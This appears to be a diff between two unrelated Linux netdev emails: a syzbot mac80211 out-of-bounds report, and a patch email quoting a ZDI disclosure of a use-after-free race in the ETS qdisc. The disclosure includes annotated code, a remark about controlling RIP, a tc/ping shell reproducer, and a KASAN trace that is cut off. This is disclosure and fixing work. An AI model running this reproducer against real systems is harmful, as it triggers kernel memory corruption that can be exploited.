@@ -1,210 +1,322 @@
-Return-Path: <netdev+bounces-242594-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-242595-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
 Received: from ams.mirrors.kernel.org (ams.mirrors.kernel.org [213.196.21.55])
-	by mail.lfdr.de (Postfix) with ESMTPS id C5486C92658
-	for <lists+netdev@lfdr.de>; Fri, 28 Nov 2025 16:04:38 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTPS id 3D7A4C9270D
+	for <lists+netdev@lfdr.de>; Fri, 28 Nov 2025 16:19:42 +0100 (CET)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by ams.mirrors.kernel.org (Postfix) with ESMTPS id 5567034AE9D
-	for <lists+netdev@lfdr.de>; Fri, 28 Nov 2025 15:04:38 +0000 (UTC)
+	by ams.mirrors.kernel.org (Postfix) with ESMTPS id B7A02344AD3
+	for <lists+netdev@lfdr.de>; Fri, 28 Nov 2025 15:19:41 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id B193E32AAAE;
-	Fri, 28 Nov 2025 15:04:35 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id AB8FD21A447;
+	Fri, 28 Nov 2025 15:19:37 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="c4H67pCP"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-il1-f205.google.com (mail-il1-f205.google.com [209.85.166.205])
+Received: from mail-qk1-f173.google.com (mail-qk1-f173.google.com [209.85.222.173])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DBD8132861F
-	for <netdev@vger.kernel.org>; Fri, 28 Nov 2025 15:04:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.166.205
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B856B79CD
+	for <netdev@vger.kernel.org>; Fri, 28 Nov 2025 15:19:35 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.222.173
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1764342275; cv=none; b=g7vPk6thU/YM+10nK/kYPOMPyBRS+9PFseGUPv4aeoZ18ZArkqBaOgTFsvKNZ7pu5AAp6kteRjIGhEGkk72lnaJcvLK3ph+BXK5Iadjrv6AgsMAX85eRwA4/S2lSa4a9078pJCUTXm87vuqE0+3Mr5nwXVekKx7WJAUrZNDI6ac=
+	t=1764343177; cv=none; b=nWWcRj9dUR4rGtC43Mu1sPY/PJIQmbi/RrqIbVP7H4la64ND7m7gHWN1pHczeYo97c7t6PNYwp0fmqEoTVxrjhdszHnGye31OOjdAdnO3uZxorll5VZtTvF9xrkRKBW2Bdrfxy/LoqqJEkdlUt0lWUGQM01jn2xlxSRh/x8OgBE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1764342275; c=relaxed/simple;
-	bh=OLObPakDDTVI8UTS0eZajCJnsEm2Cr2Ffa0+0Sz2GNs=;
-	h=MIME-Version:Date:In-Reply-To:Message-ID:Subject:From:To:
-	 Content-Type; b=CRv5AwxxhDSE5DGfPty1yGcZWUhsQ55wZ6vAJl4i9Hc+MDUGvWf7fRChLte7jZh0/mZXRXKEZ228ymS6J417Fgy/SUwYVsf5Us1uOY9diLX70y04lC74aDWM9Rl7bMzexv5aeR5AZeHaJTgY+4OdF9jl4xgykPcr1q4Mx+olg4w=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com; arc=none smtp.client-ip=209.85.166.205
-Authentication-Results: smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=syzkaller.appspotmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=M3KW2WVRGUFZ5GODRSRYTGD7.apphosting.bounces.google.com
-Received: by mail-il1-f205.google.com with SMTP id e9e14a558f8ab-433689014feso14447005ab.1
-        for <netdev@vger.kernel.org>; Fri, 28 Nov 2025 07:04:33 -0800 (PST)
+	s=arc-20240116; t=1764343177; c=relaxed/simple;
+	bh=Ff5mZRMv+LV2zexrZIF7VaAYw3I7WUiKLILz0zkpgwk=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=LnMKH85z7sFObRs9NlBkqVBfVbOR4p6QFa5cz2yNhDvTGWeQTYyxd3Tc+xOSXXOjkbOQIiO9n5fkNXk34KwEgI3Mzosde1Il9U8wTZx0PGygDoutU7ld7S3Bl3yfrt/iHaj4PeLwj51fFRVMLbJ/5xcfHGffIoU1U6RdkkQoVnY=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=c4H67pCP; arc=none smtp.client-ip=209.85.222.173
+Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
+Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
+Received: by mail-qk1-f173.google.com with SMTP id af79cd13be357-8b23b6d9f11so162878185a.3
+        for <netdev@vger.kernel.org>; Fri, 28 Nov 2025 07:19:35 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1764343175; x=1764947975; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to;
+        bh=smxYRzT0ovnvItdXzA9aSf3moHBALvJKEBil1+/46V8=;
+        b=c4H67pCPtgd963NJOvjkDdE9CDBEvKLoYaNr4cc2o9ET7tUPP9naf1595MQMVUtO6l
+         v4cwmjghE7juA0OPgcBm6yUvqhb08pMzvtmVpTh43A0btD/rp3vfqFvN8VOp2GScN52W
+         JdOP4TDKCnXprGSRi1StSydGxndNIFIeMvTgcsB6lMBOK0PB40dmzfCq4NOZucGxAXeJ
+         Qm4L8vUJNvuVOhYZmbWMPEZqZxc8H41dam21ugovi0p8gM+42VYHHLPwOQdv9I0X8jdi
+         7ipxuOyk8f70SLBdG7vkQwij9/yZLhnlQcMBw3BqrVxk8HF8xWE2MPTAyrn8kXkVcARq
+         qmHA==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1764342273; x=1764947073;
-        h=to:from:subject:message-id:in-reply-to:date:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=JMAlQjYN2X3VZjLm5if0vBNtB+6RCQ8SvO2T6L9TZj0=;
-        b=CVFnZVkt/yJhYD61dPMuAY8lOWzF98AYOtZOPOEmJCromuyibc+psbVb5m0NySSpIk
-         Yl3J8hemVS4xDLim5G7TVxwKqtauZtwvrFbO1qynCHpbQcPqm+a07LBjeZBLdK6THVL2
-         OqGqincAYCZppKiR4kDqLl2GrTV0dGNYQtwfiPKFiXfRvVPsvxLJL4Z9hFByA5tO7QvC
-         0mlu1xu5INzlHb5FDuiMgGeoTPdvw+RAnkReR6rKLjxJgu88ar34GmIpAH9T3dyaljNv
-         5ObV0XEWn9H5xJylX6dl1sMT+LX+JCSBsSV4krVpszHHXWjoPM4TTPUst76J3iPDbr4F
-         yu7g==
-X-Forwarded-Encrypted: i=1; AJvYcCVW6dNN95sAIqRLwrTr8L9RQMpLZGKB5IaU6BUJAp7bWCxDIuhMMHWP4ccAg11zghNsIMlX5Ds=@vger.kernel.org
-X-Gm-Message-State: AOJu0YyOKsdQ8faqCl2nQT6KwrROs/KSyszG0COrn5X5scJ8yTNaF6Mn
-	XMtLWuSGDOmFmMKY42+kDPbSqTb5g+dsJwlz+ww4U9Rh4QLT1ul3Vl2XfFRlyjTOXld0P1HRNpZ
-	rPTuDbnNY5xjIldbWYIKfL8IJZE8WPczuIkndqiTHPgwDsdJjCaGJVsF69q4=
-X-Google-Smtp-Source: AGHT+IH3WCB3Chj8ZTnaCjGo9mAKra91R/lNSu6AvlsYLHXvMWBMaKBhN51UzzJSa8cU6TPD9IzOt1x6HjDhrdzmW6vNlGVdtg1k
+        d=1e100.net; s=20230601; t=1764343175; x=1764947975;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=smxYRzT0ovnvItdXzA9aSf3moHBALvJKEBil1+/46V8=;
+        b=urRS6urflU/G4yoi+Z1pWqlH+ASl6oao7KySXOy0NlzHLg9ohL1eP6SMbcdzUUPLnL
+         ZW2yCq3NIIAyklH2jgXvK5Xg0WKki2nWEyW8g9oKA0bwm/ddYmu4c54+aKkuB/eK7s7X
+         VQ0sel0MwtmNx/OTbM5BXL4bN4v1Uga+l2Gb4pV3PUGrcxTRW6t9GrHmq8dRIogXGo5n
+         9ZKbZbZeLETOQcqcx6zTZ23wcOJrVoJPzEFQ2I0vOM6vnO39Sdkxq4a+h6YJeI7HTyhr
+         KYjKwcsPKW/TnZuoLHP8VnBMJvojFTD9shRnsubGBTLXdy5icEgJgiMIoC+5YwHFbb6B
+         OunQ==
+X-Forwarded-Encrypted: i=1; AJvYcCXCWs0pcixNMP1l0gyIWQJukQ0VEf6Jp0HJfrn+FL72+DBdWtUC7edGjuGB6hWfgAQlCFgTpQU=@vger.kernel.org
+X-Gm-Message-State: AOJu0YwbG+q9CFKCSAiIg/G1RJXY8kFrWyHGbk/zHwOhLRSRJMgcaE9q
+	qDRBF5mMFWgZZ5+jsefRR5PbqOpk2IwJ8mQkCwqItkz69KlKiBOKMYJPNJOpPHgYpQckyZWlWOu
+	KFc06jg==
+X-Gm-Gg: ASbGnctIhJJvwAJHmEuESK5B2SyeOuv0ryQl1NBjfqbZVeeTprZTmZxcjxDpGDSSwUw
+	xwRemkkuDVJp3Pye6JSeNOpoA6q//l2x8Dkb0lnLKXIoC4v87397dsI9wsrRajdIMUn6HBFyAdj
+	Sb4fvefsksaChcq9sbyH8LeVZnvFoMJvVflwH4AGPZz1RYUL9tNb5m8a+ADDHwnW9+dmMXaby2f
+	vrHmnkE8hLx7MK5X+HRAtBxnKE0IDQwgvTz30qmDiL5aCT32CL/nfMCKcCtEmyZdJHBczZtvXW8
+	qwYw07rPRjxjXHzHspH5h4NGC+IJho/bIPueY4t8UR6uiQGlJkC905I0f554xZl5HGXyWbxSdJy
+	NV5rc6vG9E5Nfywa2qYDGmGk3FwKYmQUrckJW88fMTSCIztHgxR9cFbsfJI5rqceJ1o8csh2Ur5
+	G5n7NHI14LL/miA08beIOslQ==
+X-Google-Smtp-Source: AGHT+IH+seoWPbpBkN/NLnmNFDU8M3ELaihmyX9ZRgUl6vWuebw5kUzkbcF17MaZbgXr4sMwJayNKg==
+X-Received: by 2002:a05:620a:4054:b0:8aa:1761:6e18 with SMTP id af79cd13be357-8b33d1b24b0mr3284295885a.4.1764343174008;
+        Fri, 28 Nov 2025 07:19:34 -0800 (PST)
+Received: from majuu.waya ([70.50.89.69])
+        by smtp.gmail.com with ESMTPSA id af79cd13be357-8b52a1df6b9sm319979385a.53.2025.11.28.07.19.32
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 28 Nov 2025 07:19:33 -0800 (PST)
+From: Jamal Hadi Salim <jhs@mojatatu.com>
+To: davem@davemloft.net,
+	kuba@kernel.org,
+	edumazet@google.com,
+	pabeni@redhat.com
+Cc: xiyou.wangcong@gmail.com,
+	jiri@resnulli.us,
+	netdev@vger.kernel.org,
+	horms@kernel.org,
+	dcaratti@redhat.com,
+	zdi-disclosures@trendmicro.com,
+	w@1wt.eu,
+	security@kernel.org,
+	tglx@linutronix.de,
+	victor@mojatatu.com,
+	Jamal Hadi Salim <jhs@mojatatu.com>
+Subject: [PATCH net] net/sched: ets: Always remove class from active list before deleting in ets_qdisc_change
+Date: Fri, 28 Nov 2025 10:19:19 -0500
+Message-Id: <20251128151919.576920-1-jhs@mojatatu.com>
+X-Mailer: git-send-email 2.34.1
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-X-Received: by 2002:a05:6e02:2167:b0:433:305c:179d with SMTP id
- e9e14a558f8ab-435b98d6d62mr259941225ab.28.1764342272846; Fri, 28 Nov 2025
- 07:04:32 -0800 (PST)
-Date: Fri, 28 Nov 2025 07:04:32 -0800
-In-Reply-To: <69198244.a70a0220.3124cb.0074.GAE@google.com>
-X-Google-Appengine-App-Id: s~syzkaller
-X-Google-Appengine-App-Id-Alias: syzkaller
-Message-ID: <6929ba00.a70a0220.d98e3.0142.GAE@google.com>
-Subject: Re: [syzbot] [wireless?] KASAN: slab-out-of-bounds Read in ieee80211_add_virtual_monitor
-From: syzbot <syzbot+bc1aabf52d0a31e91f96@syzkaller.appspotmail.com>
-To: johannes@sipsolutions.net, linux-kernel@vger.kernel.org, 
-	linux-wireless@vger.kernel.org, netdev@vger.kernel.org, 
-	syzkaller-bugs@googlegroups.com
-Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 8bit
 
-syzbot has found a reproducer for the following issue on:
+zdi-disclosures@trendmicro.com says:
 
-HEAD commit:    7d31f578f323 Add linux-next specific files for 20251128
-git tree:       linux-next
-console output: https://syzkaller.appspot.com/x/log.txt?x=1448fe12580000
-kernel config:  https://syzkaller.appspot.com/x/.config?x=ec890b8333fce099
-dashboard link: https://syzkaller.appspot.com/bug?extid=bc1aabf52d0a31e91f96
-compiler:       Debian clang version 20.1.8 (++20250708063551+0c9f909b7976-1~exp1~20250708183702.136), Debian LLD 20.1.8
-syz repro:      https://syzkaller.appspot.com/x/repro.syz?x=102b9f42580000
-C reproducer:   https://syzkaller.appspot.com/x/repro.c?x=142e3e92580000
+The vulnerability is a race condition between `ets_qdisc_dequeue` and
+`ets_qdisc_change`.  It leads to UAF on `struct Qdisc` object.
+Attacker requires the capability to create new user and network namespace
+in order to trigger the bug.
+See my additional commentary at the end of the analysis.
 
-Downloadable assets:
-disk image: https://storage.googleapis.com/syzbot-assets/9bcc6eb60940/disk-7d31f578.raw.xz
-vmlinux: https://storage.googleapis.com/syzbot-assets/895bc1bfae48/vmlinux-7d31f578.xz
-kernel image: https://storage.googleapis.com/syzbot-assets/48f15e4679f3/bzImage-7d31f578.xz
+Analysis:
 
-IMPORTANT: if you fix the issue, please add the following tag to the commit:
-Reported-by: syzbot+bc1aabf52d0a31e91f96@syzkaller.appspotmail.com
+static int ets_qdisc_change(struct Qdisc *sch, struct nlattr *opt,
+                          struct netlink_ext_ack *extack)
+{
+...
 
-mac80211_hwsim hwsim5 syzkaller0: entered promiscuous mode
-mac80211_hwsim hwsim5 syzkaller0: entered allmulticast mode
+      // (1) this lock is preventing .change handler (`ets_qdisc_change`)
+      //to race with .dequeue handler (`ets_qdisc_dequeue`)
+      sch_tree_lock(sch);
+
+      for (i = nbands; i < oldbands; i++) {
+              if (i >= q->nstrict && q->classes[i].qdisc->q.qlen)
+                      list_del_init(&q->classes[i].alist);
+              qdisc_purge_queue(q->classes[i].qdisc);
+      }
+
+      WRITE_ONCE(q->nbands, nbands);
+      for (i = nstrict; i < q->nstrict; i++) {
+              if (q->classes[i].qdisc->q.qlen) {
+		      // (2) the class is added to the q->active
+                      list_add_tail(&q->classes[i].alist, &q->active);
+                      q->classes[i].deficit = quanta[i];
+              }
+      }
+      WRITE_ONCE(q->nstrict, nstrict);
+      memcpy(q->prio2band, priomap, sizeof(priomap));
+
+      for (i = 0; i < q->nbands; i++)
+              WRITE_ONCE(q->classes[i].quantum, quanta[i]);
+
+      for (i = oldbands; i < q->nbands; i++) {
+              q->classes[i].qdisc = queues[i];
+              if (q->classes[i].qdisc != &noop_qdisc)
+                      qdisc_hash_add(q->classes[i].qdisc, true);
+      }
+
+      // (3) the qdisc is unlocked, now dequeue can be called in parallel
+      // to the rest of .change handler
+      sch_tree_unlock(sch);
+
+      ets_offload_change(sch);
+      for (i = q->nbands; i < oldbands; i++) {
+	      // (4) we're reducing the refcount for our class's qdisc and
+	      //  freeing it
+              qdisc_put(q->classes[i].qdisc);
+	      // (5) If we call .dequeue between (4) and (5), we will have
+	      // a strong UAF and we can control RIP
+              q->classes[i].qdisc = NULL;
+              WRITE_ONCE(q->classes[i].quantum, 0);
+              q->classes[i].deficit = 0;
+              gnet_stats_basic_sync_init(&q->classes[i].bstats);
+              memset(&q->classes[i].qstats, 0, sizeof(q->classes[i].qstats));
+      }
+      return 0;
+}
+
+Comment:
+This happens because some of the classes have their qdiscs assigned to
+NULL, but remain in the active list. This commit fixes this issue by always
+removing the class from the active list before deleting and freeing its
+associated qdisc
+
+Reproducer Steps
+(trimmed version of what was sent by zdi-disclosures@trendmicro.com)
+
+```
+DEV="${DEV:-lo}"
+ROOT_HANDLE="${ROOT_HANDLE:-1:}"
+BAND2_HANDLE="${BAND2_HANDLE:-20:}"   # child under 1:2
+PING_BYTES="${PING_BYTES:-48}"
+PING_COUNT="${PING_COUNT:-200000}"
+PING_DST="${PING_DST:-127.0.0.1}"
+
+SLOW_TBF_RATE="${SLOW_TBF_RATE:-8bit}"
+SLOW_TBF_BURST="${SLOW_TBF_BURST:-100b}"
+SLOW_TBF_LAT="${SLOW_TBF_LAT:-1s}"
+
+cleanup() {
+  tc qdisc del dev "$DEV" root 2>/dev/null
+}
+trap cleanup EXIT
+
+ip link set "$DEV" up
+
+tc qdisc del dev "$DEV" root 2>/dev/null || true
+
+tc qdisc add dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 2
+
+tc qdisc add dev "$DEV" parent 1:2 handle "$BAND2_HANDLE" \
+  tbf rate "$SLOW_TBF_RATE" burst "$SLOW_TBF_BURST" latency "$SLOW_TBF_LAT"
+
+tc filter add dev "$DEV" parent 1: protocol all prio 1 u32 match u32 0 0 flowid 1:2
+tc -s qdisc ls dev $DEV
+
+ping -I "$DEV" -f -c "$PING_COUNT" -s "$PING_BYTES" -W 0.001 "$PING_DST" \
+  >/dev/null 2>&1 &
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 0
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 2 strict 2
+tc -s qdisc ls dev $DEV
+tc qdisc del dev "$DEV" parent 1:2 || true
+tc -s qdisc ls dev $DEV
+tc qdisc change dev "$DEV" root handle "$ROOT_HANDLE" ets bands 1 strict 1
+```
+
+KASAN report
+```
 ==================================================================
-BUG: KASAN: slab-out-of-bounds in ieee80211_add_virtual_monitor+0xa42/0xce0 net/mac80211/iface.c:1255
-Read of size 1 at addr ffff8880753b7d90 by task syz.0.17/6029
-
-CPU: 0 UID: 0 PID: 6029 Comm: syz.0.17 Not tainted syzkaller #0 PREEMPT(full) 
-Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 10/25/2025
+BUG: KASAN: slab-use-after-free in ets_qdisc_dequeue+0x1071/0x11b0 kernel/net/sched/sch_ets.c:481
+Read of size 8 at addr ffff8880502fc018 by task ping/12308
+>
+CPU: 0 UID: 0 PID: 12308 Comm: ping Not tainted 6.18.0-rc4-dirty #1 PREEMPT(full)
+Hardware name: QEMU Ubuntu 25.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
 Call Trace:
- <TASK>
- dump_stack_lvl+0x189/0x250 lib/dump_stack.c:120
- print_address_description mm/kasan/report.c:378 [inline]
- print_report+0xca/0x240 mm/kasan/report.c:482
- kasan_report+0x118/0x150 mm/kasan/report.c:595
- ieee80211_add_virtual_monitor+0xa42/0xce0 net/mac80211/iface.c:1255
- ieee80211_do_stop+0x1786/0x1f70 net/mac80211/iface.c:746
- ieee80211_stop+0x1b1/0x240 net/mac80211/iface.c:828
- __dev_close_many+0x344/0x6b0 net/core/dev.c:1756
- __dev_close net/core/dev.c:1768 [inline]
- __dev_change_flags+0x2be/0x680 net/core/dev.c:9733
- netif_change_flags+0x88/0x1a0 net/core/dev.c:9798
- dev_change_flags+0x130/0x260 net/core/dev_api.c:68
- dev_ioctl+0x7b4/0x1150 net/core/dev_ioctl.c:842
- sock_do_ioctl+0x22c/0x300 net/socket.c:1274
- sock_ioctl+0x576/0x790 net/socket.c:1381
- vfs_ioctl fs/ioctl.c:51 [inline]
- __do_sys_ioctl fs/ioctl.c:597 [inline]
- __se_sys_ioctl+0xfc/0x170 fs/ioctl.c:583
- do_syscall_x64 arch/x86/entry/syscall_64.c:63 [inline]
- do_syscall_64+0xfa/0xf80 arch/x86/entry/syscall_64.c:94
- entry_SYSCALL_64_after_hwframe+0x77/0x7f
-RIP: 0033:0x7f5875f8f749
-Code: ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 a8 ff ff ff f7 d8 64 89 01 48
-RSP: 002b:00007ffc52c16018 EFLAGS: 00000246 ORIG_RAX: 0000000000000010
-RAX: ffffffffffffffda RBX: 00007f58761e5fa0 RCX: 00007f5875f8f749
-RDX: 0000200000000000 RSI: 0000000000008914 RDI: 0000000000000006
-RBP: 00007f5876013f91 R08: 0000000000000000 R09: 0000000000000000
-R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
-R13: 00007f58761e5fa0 R14: 00007f58761e5fa0 R15: 0000000000000003
- </TASK>
+ <IRQ>
+ __dump_stack kernel/lib/dump_stack.c:94
+ dump_stack_lvl+0x100/0x190 kernel/lib/dump_stack.c:120
+ print_address_description kernel/mm/kasan/report.c:378
+ print_report+0x156/0x4c9 kernel/mm/kasan/report.c:482
+ kasan_report+0xdf/0x110 kernel/mm/kasan/report.c:595
+ ets_qdisc_dequeue+0x1071/0x11b0 kernel/net/sched/sch_ets.c:481
+ dequeue_skb kernel/net/sched/sch_generic.c:294
+ qdisc_restart kernel/net/sched/sch_generic.c:399
+ __qdisc_run+0x1c9/0x1b00 kernel/net/sched/sch_generic.c:417
+ __dev_xmit_skb kernel/net/core/dev.c:4221
+ __dev_queue_xmit+0x2848/0x4410 kernel/net/core/dev.c:4729
+ dev_queue_xmit kernel/./include/linux/netdevice.h:3365
+[...]
 
-The buggy address belongs to the physical page:
-page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xffff8880753b5d40 pfn:0x753b4
-head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-memcg:ffff888026064282
-flags: 0xfff00000000040(head|node=0|zone=1|lastcpupid=0x7ff)
-page_type: f8(unknown)
-raw: 00fff00000000040 0000000000000000 dead000000000122 0000000000000000
-raw: ffff8880753b5d40 0000000000000000 00000000f8000000 ffff888026064282
-head: 00fff00000000040 0000000000000000 dead000000000122 0000000000000000
-head: ffff8880753b5d40 0000000000000000 00000000f8000000 ffff888026064282
-head: 00fff00000000002 ffffea0001d4ed01 00000000ffffffff 00000000ffffffff
-head: ffffffffffffffff 0000000000000000 00000000ffffffff 0000000000000004
-page dumped because: kasan: bad access detected
-page_owner tracks the page as allocated
-page last allocated via order 2, migratetype Unmovable, gfp_mask 0x446dc0(GFP_KERNEL_ACCOUNT|__GFP_ZERO|__GFP_NOWARN|__GFP_RETRY_MAYFAIL|__GFP_COMP), pid 6029, tgid 6029 (syz.0.17), ts 111996806551, free_ts 111081173010
- set_page_owner include/linux/page_owner.h:32 [inline]
- post_alloc_hook+0x234/0x290 mm/page_alloc.c:1846
- prep_new_page mm/page_alloc.c:1854 [inline]
- get_page_from_freelist+0x2365/0x2440 mm/page_alloc.c:3915
- __alloc_frozen_pages_noprof+0x181/0x370 mm/page_alloc.c:5210
- alloc_pages_mpol+0x232/0x4a0 mm/mempolicy.c:2486
- ___kmalloc_large_node+0x4e/0x150 mm/slub.c:5593
- __kmalloc_large_node_noprof+0x18/0x90 mm/slub.c:5624
- __do_kmalloc_node mm/slub.c:5640 [inline]
- __kvmalloc_node_noprof+0x6e/0x920 mm/slub.c:7129
- alloc_netdev_mqs+0xa8/0x1200 net/core/dev.c:12011
- ieee80211_if_add+0x45c/0x1370 net/mac80211/iface.c:2227
- ieee80211_add_iface+0xb5/0x5a0 net/mac80211/cfg.c:217
- rdev_add_virtual_intf net/wireless/rdev-ops.h:50 [inline]
- _nl80211_new_interface net/wireless/nl80211.c:4706 [inline]
- nl80211_new_interface+0x883/0x1130 net/wireless/nl80211.c:4764
- genl_family_rcv_msg_doit+0x215/0x300 net/netlink/genetlink.c:1115
- genl_family_rcv_msg net/netlink/genetlink.c:1195 [inline]
- genl_rcv_msg+0x60e/0x790 net/netlink/genetlink.c:1210
- netlink_rcv_skb+0x208/0x470 net/netlink/af_netlink.c:2550
- genl_rcv+0x28/0x40 net/netlink/genetlink.c:1219
- netlink_unicast_kernel net/netlink/af_netlink.c:1318 [inline]
- netlink_unicast+0x82f/0x9e0 net/netlink/af_netlink.c:1344
-page last free pid 6006 tgid 6006 stack trace:
- reset_page_owner include/linux/page_owner.h:25 [inline]
- free_pages_prepare mm/page_alloc.c:1395 [inline]
- __free_frozen_pages+0xbc8/0xd30 mm/page_alloc.c:2943
- __slab_free+0x21b/0x2a0 mm/slub.c:5999
- qlink_free mm/kasan/quarantine.c:163 [inline]
- qlist_free_all+0x97/0x100 mm/kasan/quarantine.c:179
- kasan_quarantine_reduce+0x148/0x160 mm/kasan/quarantine.c:286
- __kasan_slab_alloc+0x22/0x80 mm/kasan/common.c:349
- kasan_slab_alloc include/linux/kasan.h:252 [inline]
- slab_post_alloc_hook mm/slub.c:4948 [inline]
- slab_alloc_node mm/slub.c:5258 [inline]
- kmem_cache_alloc_noprof+0x37d/0x710 mm/slub.c:5265
- vm_area_dup+0x2b/0x680 mm/vma_init.c:123
- __split_vma+0x1a9/0xa00 mm/vma.c:508
- split_vma mm/vma.c:591 [inline]
- vma_modify+0x952/0x1a70 mm/vma.c:1634
- vma_modify_flags+0x208/0x2e0 mm/vma.c:1654
- mprotect_fixup+0x43c/0xa30 mm/mprotect.c:756
- do_mprotect_pkey+0x8c5/0xcd0 mm/mprotect.c:930
- __do_sys_mprotect mm/mprotect.c:951 [inline]
- __se_sys_mprotect mm/mprotect.c:948 [inline]
- __x64_sys_mprotect+0x80/0x90 mm/mprotect.c:948
- do_syscall_x64 arch/x86/entry/syscall_64.c:63 [inline]
- do_syscall_64+0xfa/0xf80 arch/x86/entry/syscall_64.c:94
- entry_SYSCALL_64_after_hwframe+0x77/0x7f
+Allocated by task 17115:
+ kasan_save_stack+0x30/0x50 kernel/mm/kasan/common.c:56
+ kasan_save_track+0x14/0x30 kernel/mm/kasan/common.c:77
+ poison_kmalloc_redzone kernel/mm/kasan/common.c:400
+ __kasan_kmalloc+0xaa/0xb0 kernel/mm/kasan/common.c:417
+ kasan_kmalloc kernel/./include/linux/kasan.h:262
+ __do_kmalloc_node kernel/mm/slub.c:5642
+ __kmalloc_node_noprof+0x34e/0x990 kernel/mm/slub.c:5648
+ kmalloc_node_noprof kernel/./include/linux/slab.h:987
+ qdisc_alloc+0xb8/0xc30 kernel/net/sched/sch_generic.c:950
+ qdisc_create_dflt+0x93/0x490 kernel/net/sched/sch_generic.c:1012
+ ets_class_graft+0x4fd/0x800 kernel/net/sched/sch_ets.c:261
+ qdisc_graft+0x3e4/0x1780 kernel/net/sched/sch_api.c:1196
+[...]
 
-Memory state around the buggy address:
- ffff8880753b7c80: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
- ffff8880753b7d00: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
->ffff8880753b7d80: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
-                         ^
- ffff8880753b7e00: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
- ffff8880753b7e80: fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe
-==================================================================
+Freed by task 9905:
+ kasan_save_stack+0x30/0x50 kernel/mm/kasan/common.c:56
+ kasan_save_track+0x14/0x30 kernel/mm/kasan/common.c:77
+ __kasan_save_free_info+0x3b/0x70 kernel/mm/kasan/generic.c:587
+ kasan_save_free_info kernel/mm/kasan/kasan.h:406
+ poison_slab_object kernel/mm/kasan/common.c:252
+ __kasan_slab_free+0x5f/0x80 kernel/mm/kasan/common.c:284
+ kasan_slab_free kernel/./include/linux/kasan.h:234
+ slab_free_hook kernel/mm/slub.c:2539
+ slab_free kernel/mm/slub.c:6630
+ kfree+0x144/0x700 kernel/mm/slub.c:6837
+ rcu_do_batch kernel/kernel/rcu/tree.c:2605
